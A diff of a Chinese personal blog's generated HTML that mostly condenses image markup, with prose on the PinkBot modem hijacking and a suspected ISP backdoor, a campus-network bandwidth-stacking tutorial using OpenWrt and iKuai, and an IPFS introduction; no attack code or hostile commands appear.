+        data-thumbnail="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"data-sub-html="<h2>百度贴吧被劫持到升级页面</h2><p>百度贴吧被劫持到升级页面</p>">
+        <imgsrc="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"
+            alt="/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp"height="985"width="1919"loading="lazy"
         />
     </a><figcaption class="image-caption">百度贴吧被劫持到升级页面</figcaption>
     </figure></p>
@@ -1641,32 +1345,12 @@
 </div>
 </div><p>很明显，这是一个后门，或者是一个漏洞，我更相信这是一个官方后门</p>
 <p>根据它的写法我稍微测试了一下，通过jsonp跨域，进行CSRF，的确可以执行任意命令</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"
         title="测试这个后门"
-        data-thumbnail="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"
-        
-            data-sub-html="<h2>测试后门</h2><p>测试这个后门</p>"
-        
-        >
-        <img
-            
-            src="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"
-            alt="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"
-             height="1079"
-             width="1919"
-            loading="lazy"
+        data-thumbnail="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"data-sub-html="<h2>测试后门</h2><p>测试这个后门</p>">
+        <imgsrc="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"
+            alt="/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp"height="1079"width="1919"loading="lazy"
         />
     </a><figcaption class="image-caption">测试后门</figcaption>
     </figure></p>
@@ -1725,32 +1409,12 @@
 <h3 id="联通工作人员上门升级"><a href="#联通工作人员上门升级" class="header-mark headerLink">联通工作人员上门升级</a></h3>
 <p>2020年5月10号下午，联通工作人员上门进行光猫升级。具体升级方法就是把一块板子通过光猫侧面的口插到主板上，然后通过手机上的app进行固件刷写</p>
 <p>在交流的过程中，他透漏光猫大批量被控，有对外攻击流量，接上面要求需要对所有光猫进行升级。我家的光猫在线升级失败，只能到户手动完成。我看了一下他需要上门的名单，看样子我们这个区域关闭了在线管理接口的用户还不少啊哈哈哈</p>
-<p><figure>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<a class="lightgallery"
+<p><figure><a class="lightgallery"
         href="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"
         title="联通工作人员上门升级"
-        data-thumbnail="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"
-        
-            data-sub-html="<h2>联通工作人员上门升级</h2><p>联通工作人员上门升级</p>"
-        
-        >
-        <img
-            
-            src="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"
-            alt="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"
-             height="826"
-             width="1080"
-            loading="lazy"
+        data-thumbnail="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"data-sub-html="<h2>联通工作人员上门升级</h2><p>联通工作人员上门升级</p>">
+        <imgsrc="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"
+            alt="/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp"height="826"width="1080"loading="lazy"
         />
     </a><figcaption class="image-caption">联通工作人员上门升级</figcaption>
     </figure></p>
@@ -2219,90 +1883,26 @@
 <p>主要涉及到两个插件：kmod-macvlan和mwan3</p>
 <h3 id="添加设备获取ip"><a href="#添加设备获取ip" class="header-mark headerLink">添加设备，获取IP</a></h3>
 <p>首先在正确配置好网络的基础上，先创建网络设备，类型是macvlan，在学习了Linux下手工操作的基础上，这里的配置项都好理解</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/network-device_hua4a41f9c73827df582ea964037e09721_41569_656x368_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/network-device_hua4a41f9c73827df582ea964037e09721_41569_656x368_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/network-device_hua4a41f9c73827df582ea964037e09721_41569_656x368_resize_q75_h2_box_3.webp"
-        title="网络设备"
-         height="368"
-         width="656"
-        loading="lazy"
+        title="网络设备"height="368"width="656"loading="lazy"
     /></p>
 <p>要几拨就添加几个设备，注意最好手工指定一下mac，基础设备选正常上网的wan口物理设备</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/network-device-add_hu4a2aa46d6abc4695e42f682157e0b152_20526_561x321_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/network-device-add_hu4a2aa46d6abc4695e42f682157e0b152_20526_561x321_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/network-device-add_hu4a2aa46d6abc4695e42f682157e0b152_20526_561x321_resize_q75_h2_box_3.webp"
-        title="添加网络设备"
-         height="321"
-         width="561"
-        loading="lazy"
+        title="添加网络设备"height="321"width="561"loading="lazy"
     /></p>
 <p>然后添加相同数量的接口，协议选DHCP，接口设备选刚刚创建的，一一对应</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/network-interface-add_hu621dfbbca86664cd67b870fcdae67db3_36472_567x366_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/network-interface-add_hu621dfbbca86664cd67b870fcdae67db3_36472_567x366_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/network-interface-add_hu621dfbbca86664cd67b870fcdae67db3_36472_567x366_resize_q75_h2_box_3.webp"
-        title="添加网络接口"
-         height="366"
-         width="567"
-        loading="lazy"
+        title="添加网络接口"height="366"width="567"loading="lazy"
     /></p>
 <p>接口添加好后，进行连接就会自动获取IP了，然后与上面手工方式一样，把所有IP都认证一下</p>
 <h3 id="配置mwan3分流"><a href="#配置mwan3分流" class="header-mark headerLink">配置mwan3分流</a></h3>
 <p>在mwan的管理界面，首先添加接口，与网络里面刚刚配置的接口一一对应</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-interface_hu4152b2e4189d37b51917b8dfa8415502_33920_797x426_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-interface_hu4152b2e4189d37b51917b8dfa8415502_33920_797x426_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-interface_hu4152b2e4189d37b51917b8dfa8415502_33920_797x426_resize_q75_h2_box_3.webp"
-        title="添加接口"
-         height="426"
-         width="797"
-        loading="lazy"
+        title="添加接口"height="426"width="797"loading="lazy"
     /></p>
 <div class="details admonition note open">
         <div class="details-summary admonition-title">
@@ -2313,109 +1913,29 @@
         </div>
     </div>
 <p>然后添加成员，与刚刚添加的接口一一对应，这里添加的可以在后面策略那里选择</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-member_hu128229219abfac83ba956b2bc1ee0e26_32285_730x372_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-member_hu128229219abfac83ba956b2bc1ee0e26_32285_730x372_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-member_hu128229219abfac83ba956b2bc1ee0e26_32285_730x372_resize_q75_h2_box_3.webp"
-        title="添加成员"
-         height="372"
-         width="730"
-        loading="lazy"
+        title="添加成员"height="372"width="730"loading="lazy"
     /></p>
 <p>添加策略，图中第一条是负载均衡策略，刚刚添加的成员全都选中，意思就是说同时使用这所有的网络</p>
 <p>后面几条策略分别是用来测试想用网络设备的</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-policy_huf0057ef3cab073b3a770a321c785247d_54579_766x533_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-policy_huf0057ef3cab073b3a770a321c785247d_54579_766x533_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-policy_huf0057ef3cab073b3a770a321c785247d_54579_766x533_resize_q75_h2_box_3.webp"
-        title="添加策略"
-         height="533"
-         width="766"
-        loading="lazy"
+        title="添加策略"height="533"width="766"loading="lazy"
     /></p>
 <p>最后添加分流规则，最简单的如图所示，目的地址不限，端口不限，协议不限，都走负载均衡策略，也就是从所有网口出</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-rule_hua52f95ea462474b0cf9ac8cb58272a1d_39444_666x444_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-rule_hua52f95ea462474b0cf9ac8cb58272a1d_39444_666x444_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-rule_hua52f95ea462474b0cf9ac8cb58272a1d_39444_666x444_resize_q75_h2_box_3.webp"
-        title="添加规则"
-         height="444"
-         width="666"
-        loading="lazy"
+        title="添加规则"height="444"width="666"loading="lazy"
     /></p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-rule-config_hu5f3f57b70c1748ba92fc557370ed1263_30177_626x380_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-rule-config_hu5f3f57b70c1748ba92fc557370ed1263_30177_626x380_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/mwan-rule-config_hu5f3f57b70c1748ba92fc557370ed1263_30177_626x380_resize_q75_h2_box_3.webp"
-        title="规则配置"
-         height="380"
-         width="626"
-        loading="lazy"
+        title="规则配置"height="380"width="626"loading="lazy"
     /></p>
 <p>在状态面板可以看到，多拨成功</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/openwrt/status_hu8611a9ab490101676948cbbd5cc19e0d_17650_793x220_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/openwrt/status_hu8611a9ab490101676948cbbd5cc19e0d_17650_793x220_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/openwrt/status_hu8611a9ab490101676948cbbd5cc19e0d_17650_793x220_resize_q75_h2_box_3.webp"
-        title="多拨成功"
-         height="220"
-         width="793"
-        loading="lazy"
+        title="多拨成功"height="220"width="793"loading="lazy"
     /></p>
 <div class="details admonition tip open">
         <div class="details-summary admonition-title">
@@ -2429,68 +1949,20 @@
 <p>正好我在的实验室里有老旧的台式机，又有多个网卡，我就安装了以分流著称的iKuai系统</p>
 <p>爱快路由系统对性能要求很高，64位甚至要求4G运存才能安装，不太建议宿舍用，不过实话实话这个是真的爽</p>
 <p>首先在网路设置中，选择正确的物理网卡，接入方式选<code>基于物理网卡的混合模式</code>，在DHCP模式下添加多个虚拟网络接口，mac地址自己指定</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/ikuai/add-wan-if_hu684daeba6b87130d2284bdfe353c3f23_139130_719x426_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/ikuai/add-wan-if_hu684daeba6b87130d2284bdfe353c3f23_139130_719x426_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/ikuai/add-wan-if_hu684daeba6b87130d2284bdfe353c3f23_139130_719x426_resize_q75_h2_box_3.webp"
-        title="添加网络接口"
-         height="426"
-         width="719"
-        loading="lazy"
+        title="添加网络接口"height="426"width="719"loading="lazy"
     /></p>
 <p>关开网络接口，让其DHCP获取到IP地址，然后按照之前说的方法进行网络认证</p>
 <p>然后进入分流设置，配置多线负载</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/ikuai/load-balance_huee21e4efc6f414d5c51608629c69f835_46739_599x128_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/ikuai/load-balance_huee21e4efc6f414d5c51608629c69f835_46739_599x128_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/ikuai/load-balance_huee21e4efc6f414d5c51608629c69f835_46739_599x128_resize_q75_h2_box_3.webp"
-        title="负载均衡"
-         height="128"
-         width="599"
-        loading="lazy"
+        title="负载均衡"height="128"width="599"loading="lazy"
     /></p>
 <p>添加的时候有多种负载模式可供选择，可以添加多个负载规则。注意要把前面创建的网络接口全部开启</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/campus-network-speed-overlay/ikuai/add-load-balance_hu0871626870399a0d506d030ec9889f3e_19308_664x344_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/campus-network-speed-overlay/ikuai/add-load-balance_hu0871626870399a0d506d030ec9889f3e_19308_664x344_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/campus-network-speed-overlay/ikuai/add-load-balance_hu0871626870399a0d506d030ec9889f3e_19308_664x344_resize_q75_h2_box_3.webp"
-        title="负载均衡"
-         height="344"
-         width="664"
-        loading="lazy"
+        title="负载均衡"height="344"width="664"loading="lazy"
     /></p>
 <p>对！就是这么简单，iKuai就是牛，已经把网速叠加成功了</p>
 <h2 id="新发现"><a href="#新发现" class="header-mark headerLink">新发现</a></h2>
@@ -2529,95 +2001,35 @@
 </ul>
 <h2 id="ipfs的优点"><a href="#ipfs的优点" class="header-mark headerLink">IPFS的优点</a></h2>
 <h3 id="与现有web比较"><a href="#与现有web比较" class="header-mark headerLink">与现有Web比较</a></h3>
-<p>
-
-
-
-
-    
-<img
-        
-        src="compare/ipfs-illustration-http.svg"
+<p><imgsrc="compare/ipfs-illustration-http.svg"
         alt="compare/ipfs-illustration-http.svg"
-        title="Today&amp;rsquo;s web is inefficient and expensive"
-        
-        
-        loading="lazy"
+        title="Today&amp;rsquo;s web is inefficient and expensive"loading="lazy"
     /></p>
 <h4 id="现有的网络技术效率低下成本高昂"><a href="#现有的网络技术效率低下成本高昂" class="header-mark headerLink">现有的网络技术效率低下、成本高昂</a></h4>
 <p>HTTP一次从一台计算机下载文件，而不是同时从多台计算机获取文件。点对点IPFS<strong>节省了大量的带宽</strong>，视频高达60%，这使得无需重复地高效地分发大量数据成为可能。</p>
-<p>
-
-
-
-
-    
-<img
-        
-        src="compare/ipfs-illustration-history.svg"
+<p><imgsrc="compare/ipfs-illustration-history.svg"
         alt="compare/ipfs-illustration-history.svg"
-        title="Today&amp;rsquo;s web can&amp;rsquo;t preserve humanity&amp;rsquo;s history"
-        
-        
-        loading="lazy"
+        title="Today&amp;rsquo;s web can&amp;rsquo;t preserve humanity&amp;rsquo;s history"loading="lazy"
     /></p>
 <h4 id="现有的网络无法保存人类的历史"><a href="#现有的网络无法保存人类的历史" class="header-mark headerLink">现有的网络无法保存人类的历史</a></h4>
 <p>一个网页的平均寿命是100天，然后就永远消失了。我们这个时代的主要媒介还不够脆弱。IPFS<strong>保留文件的每一个版本</strong>，并使为镜像数据建立弹性网络变得简单。</p>
-<p>
-
-
-
-
-    
-<img
-        
-        src="compare/ipfs-illustration-centralized.svg"
+<p><imgsrc="compare/ipfs-illustration-centralized.svg"
         alt="compare/ipfs-illustration-centralized.svg"
-        title="Today&amp;rsquo;s web is centralized, limiting opportunity"
-        
-        
-        loading="lazy"
+        title="Today&amp;rsquo;s web is centralized, limiting opportunity"loading="lazy"
     /></p>
 <h4 id="现有的网络是集中的限制了机会"><a href="#现有的网络是集中的限制了机会" class="header-mark headerLink">现有的网络是集中的，限制了机会</a></h4>
 <p>互联网作为人类历史上最伟大的均衡器之一，推动了创新的发展，但日益巩固的集权控制威胁着这一进步。IPFS通过分布式技术来避免这一点。</p>
-<p>
-
-
-
-
-    
-<img
-        
-        src="compare/ipfs-illustration-network.svg"
+<p><imgsrc="compare/ipfs-illustration-network.svg"
         alt="compare/ipfs-illustration-network.svg"
-        title="Today&amp;rsquo;s web is addicted to the backbone"
-        
-        
-        loading="lazy"
+        title="Today&amp;rsquo;s web is addicted to the backbone"loading="lazy"
     /></p>
 <h4 id="现有的网络深度依赖主干网"><a href="#现有的网络深度依赖主干网" class="header-mark headerLink">现有的网络深度依赖主干网</a></h4>
 <p>IPFS支持创建多样化的弹性网络，以实现<strong>持久可用性</strong>，无论是否有Internet主干网连接。这意味着发展中国家在自然灾害期间，或者在咖啡厅的wi-fi上时，能够更好地连接。</p>
 <h3 id="ipfs做的更好"><a href="#ipfs做的更好" class="header-mark headerLink">IPFS做的更好</a></h3>
 <p>IPFS宣称，无论你现在在用已有的Web技术干什么，IPFS都可以做到更好。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/usefull/usefull_1_hu44cd894b481e49439e4024ed796a7bf4_20225_538x166_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/usefull/usefull_1_hu44cd894b481e49439e4024ed796a7bf4_20225_538x166_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/usefull/usefull_1_hu44cd894b481e49439e4024ed796a7bf4_20225_538x166_resize_q75_h2_box_3.webp"
-        title="usefull 1"
-         height="166"
-         width="538"
-        loading="lazy"
+        title="usefull 1"height="166"width="538"loading="lazy"
     /></p>
 <ul>
 <li>
@@ -2633,25 +2045,9 @@
 <p>如果您使用或分发大型数据集，IPFS可以帮助您提供快速的性能和分散的归档</p>
 </li>
 </ul>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/usefull/usefull_2_hud188cfbd7834764fa61fe071c6cf27c8_19823_524x160_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/usefull/usefull_2_hud188cfbd7834764fa61fe071c6cf27c8_19823_524x160_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/usefull/usefull_2_hud188cfbd7834764fa61fe071c6cf27c8_19823_524x160_resize_q75_h2_box_3.webp"
-        title="usefull 2"
-         height="160"
-         width="524"
-        loading="lazy"
+        title="usefull 2"height="160"width="524"loading="lazy"
     /></p>
 <ul>
 <li>
@@ -2669,201 +2065,57 @@
 </ul>
 <h2 id="工作原理"><a href="#工作原理" class="header-mark headerLink">工作原理</a></h2>
 <p>让我们通过向IPFS添加一个文件这个过程，来简单看一下IPFS是如何工作的</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/work/work_1_huec82a8acf873cbbdd65180e0cc3cbe80_18454_715x143_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/work/work_1_huec82a8acf873cbbdd65180e0cc3cbe80_18454_715x143_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/work/work_1_huec82a8acf873cbbdd65180e0cc3cbe80_18454_715x143_resize_q75_h2_box_3.webp"
-        title="第一步"
-         height="143"
-         width="715"
-        loading="lazy"
+        title="第一步"height="143"width="715"loading="lazy"
     /></p>
 <p>IPFS将文件切割为多个小块，每个块的大小为256KB，块的数量由文件的大小决定。然后计算每个块的Hash，作为这个块的指纹。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/work/work_2_hud94bb78b709f95278d72421a0a468b77_6001_687x148_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/work/work_2_hud94bb78b709f95278d72421a0a468b77_6001_687x148_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/work/work_2_hud94bb78b709f95278d72421a0a468b77_6001_687x148_resize_q75_h2_box_3.webp"
-        title="第二步"
-         height="148"
-         width="687"
-        loading="lazy"
+        title="第二步"height="148"width="687"loading="lazy"
     /></p>
 <p>因为很多文件数据有重复的部分，在切割成小块后，这些小块有的会完全相同，表现出来就是指纹Hash相同。拥有相同指纹Hash的块被视为同一个块，所以相同的数据在IPFS都表现为同一块，这也就消除了存储相同数据的额外开销。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/work/work_3_hu5cef949eb7c1c8c22a04f4a9246efd20_12989_713x144_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/work/work_3_hu5cef949eb7c1c8c22a04f4a9246efd20_12989_713x144_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/work/work_3_hu5cef949eb7c1c8c22a04f4a9246efd20_12989_713x144_resize_q75_h2_box_3.webp"
-        title="第三步"
-         height="144"
-         width="713"
-        loading="lazy"
+        title="第三步"height="144"width="713"loading="lazy"
     /></p>
 <p>IPFS网络中的每一个节点只存储自己<strong>感兴趣</strong>的内容，也就是该IPFS节点的使用者经常访问、或指定要固定的内容。</p>
 <p>除此之外还需要额外存储一些索引信息，这些索引信息用来帮助文件查找的寻址工作。当我们需要获取某个块的时候，索引信息就可以告诉IPFS这个特定块在哪些节点上有存储。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/work/work_4_hu094a3b5b5c985399ecfefd792883cc42_15836_701x144_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/work/work_4_hu094a3b5b5c985399ecfefd792883cc42_15836_701x144_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/work/work_4_hu094a3b5b5c985399ecfefd792883cc42_15836_701x144_resize_q75_h2_box_3.webp"
-        title="第四步"
-         height="144"
-         width="701"
-        loading="lazy"
+        title="第四步"height="144"width="701"loading="lazy"
     /></p>
 <p>当我们要从IPFS中查看或者下载某个文件时，IPFS便要通过改文件的<strong>指纹Hash</strong>查询索引信息，并向自己连接的节点进行询问。这一步需要找到IPFS网络中的哪些节点存储着自己想要的文件数据块。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/work/one-ipfs-node-only_hu134fbf3dc9c72655ec002a1361ebd0db_348906_1673x1045_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/work/one-ipfs-node-only_hu134fbf3dc9c72655ec002a1361ebd0db_348906_1673x1045_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/work/one-ipfs-node-only_hu134fbf3dc9c72655ec002a1361ebd0db_348906_1673x1045_resize_q75_h2_box_3.webp"
-        title="IPFS寻址"
-         height="1045"
-         width="1673"
-        loading="lazy"
+        title="IPFS寻址"height="1045"width="1673"loading="lazy"
     /></p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/work/work_5_hu3ebe2645eb4e300f35ec45f1a3b47252_19622_710x139_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/work/work_5_hu3ebe2645eb4e300f35ec45f1a3b47252_19622_710x139_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/work/work_5_hu3ebe2645eb4e300f35ec45f1a3b47252_19622_710x139_resize_q75_h2_box_3.webp"
-        title="第五步"
-         height="139"
-         width="710"
-        loading="lazy"
+        title="第五步"height="139"width="710"loading="lazy"
     /></p>
 <p>如果你无法记住IPFS中存储的文件的指纹Hash(是一段非常长的字符串)，实际上你也无须记住这个Hash，IPFS提供了<strong>IPNS</strong>来提供<strong>人类可读名字</strong>到<strong>指纹Hash</strong>之间的映射，你只需要记住你添加在IPNS中的人类可读名字即可。</p>
 <h2 id="基本使用"><a href="#基本使用" class="header-mark headerLink">基本使用</a></h2>
 <h3 id="安装"><a href="#安装" class="header-mark headerLink">安装</a></h3>
 <p>设置环境变量<code>IPFS_PATH</code>，这个目录在后面进行初始化和使用的时候会作为IPFS的本地仓库。如果这里不进行设置，IPFS默认会使用用户目录下的<code>.ipfs</code>文件夹作为本地仓库。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/tutorial/ipfs_env_hu53d55428ab457539b5df30a7ebf7cf23_15025_610x264_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/tutorial/ipfs_env_hu53d55428ab457539b5df30a7ebf7cf23_15025_610x264_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/tutorial/ipfs_env_hu53d55428ab457539b5df30a7ebf7cf23_15025_610x264_resize_q75_h2_box_3.webp"
-        title="设置环境变量 IPFS_PATH"
-         height="264"
-         width="610"
-        loading="lazy"
+        title="设置环境变量 IPFS_PATH"height="264"width="610"loading="lazy"
     /></p>
 <h4 id="初始化"><a href="#初始化" class="header-mark headerLink">初始化</a></h4>
 <p>运行命令 <code>ipfs init</code> 进行初始化，这一步会初始化密钥对，并在刚刚指定的<code>IPFS_PATH</code>目录创建初始文件。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/tutorial/ipfs_init_hue0c94ec89459672a8c5cc644ff0765dd_18447_727x152_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/tutorial/ipfs_init_hue0c94ec89459672a8c5cc644ff0765dd_18447_727x152_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/tutorial/ipfs_init_hue0c94ec89459672a8c5cc644ff0765dd_18447_727x152_resize_q75_h2_box_3.webp"
-        title="初始化"
-         height="152"
-         width="727"
-        loading="lazy"
+        title="初始化"height="152"width="727"loading="lazy"
     /></p>
 <h4 id="查看节点id信息"><a href="#查看节点id信息" class="header-mark headerLink">查看节点ID信息</a></h4>
 <p>运行命令 <code>ipfs id</code> 即可查看自己IPFS节点ID信息，包含了节点ID、公钥、地址、代理版本、协议版本、支持的协议等信息</p>
 <p>可以通过 <code>ipfs id 别人的ID</code>来查看别人的节点ID信息</p>
 <h4 id="检查可用性"><a href="#检查可用性" class="header-mark headerLink">检查可用性</a></h4>
 <p>通过显示的命令来检查可用性，这里使用<code>ipfs cat</code>命令来查看指定的<code>CID</code>对应的内容。</p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
-        src="/posts/tutorials/p2p/ipfs/tutorial/ipfs_init_hue0c94ec89459672a8c5cc644ff0765dd_18447_727x152_resize_q75_h2_box_3.webp"
+<p><imgsrc="/posts/tutorials/p2p/ipfs/tutorial/ipfs_init_hue0c94ec89459672a8c5cc644ff0765dd_18447_727x152_resize_q75_h2_box_3.webp"
         alt="/posts/tutorials/p2p/ipfs/tutorial/ipfs_init_hue0c94ec89459672a8c5cc644ff0765dd_18447_727x152_resize_q75_h2_box_3.webp"
-        title="IPFS cat"
-         height="152"
-         width="727"
-        loading="lazy"
+        title="IPFS cat"height="152"width="727"loading="lazy"
     /></p>
 <h4 id="开启守护进程"><a href="#开启守护进程" class="header-mark headerLink">开启守护进程</a></h4>
 <p>运行下面命令开启守护进程</p>
@@ -2881,70 +2133,22 @@
 <p>查看文本使用 <code>ipfs cat</code>命令来进行，就如前面检查可用性的使用一样</p>
 <h4 id="下载二进制"><a href="#下载二进制" class="header-mark headerLink">下载二进制</a></h4>
 <p>对于图片、视频等文件，无法使用<code>cat</code>命令来查看（cat出来是一堆乱码），此时我们可以使用<code>ipfs get cid</code>的方式来将文件下载到本地。不过这样直接下载文件名会是指定的CID，一个长字符串不具有识别性，我们可以重定向到指定的文件，<code>ipfs get cid -o newname.png</code></p>
-<p>
-
-
-
-
-    
-        
-        
-        
-        
-    
-<img
-        
